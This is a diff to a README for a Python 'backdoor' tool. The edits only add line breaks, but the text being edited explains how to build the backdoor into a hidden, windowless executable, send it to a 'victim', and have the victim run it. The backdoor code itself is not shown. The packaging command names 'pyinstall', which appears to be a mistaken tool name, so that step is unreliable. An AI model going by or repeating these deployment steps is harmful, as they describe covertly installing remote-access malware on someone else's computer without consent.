@@ -20,27 +20,34 @@ python server.py
 <div style="background: #555;">
 First Try:
 <br>
+  <br>
 pip install auto-py-to-exe
 <br>
+  <br>
 auto-py-to-exe
 <br>
+  <br>
 </div>
 <div style="background: #555;">
 Second Try:
 <br>
+  <br>
 pip install pyinstall
 <br>
+  <br></div>
 pyinstall backdoor.py --onefile --noconsole
+<br>
 <br>
 </div>
 # HOW TO RUN THIS FILE TO  VICTIM PC
 <div style="background: #555;">
 <br>
+  <br>
 sent the python file or exe file to victim then run this file if you want to run python
 <br>
 python backdoor.py
 <br>
-
+<br></div>
 or if you want to run exe just click it it will automatically closed So bye GUYS
 <br>
 </div>
